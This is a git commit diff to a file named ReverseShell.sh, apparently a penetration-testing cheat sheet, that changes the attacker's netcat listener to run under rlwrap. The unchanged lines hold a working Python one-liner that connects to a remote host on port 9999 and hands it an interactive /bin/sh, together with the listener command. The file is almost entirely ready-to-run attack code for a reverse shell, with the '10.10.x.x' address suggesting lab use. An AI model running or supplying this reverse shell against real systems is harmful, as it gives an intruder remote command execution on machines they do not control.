ea63f906ff80e7574c84a5fd57784c9116ab3be4
michwojt <xy97@wp.pl>
2025-01-13 19:51:40 +0100

    Add rlwrap to netcat

--- ReverseShell.sh
+++ ReverseShell.sh
@@ -1,6 +1,6 @@
 #Listen on atacker server
 
-nc -lnvp 9999
+rlwrap nc -lnvp 9999
 
 #Open reverse shell using python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.x.x",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
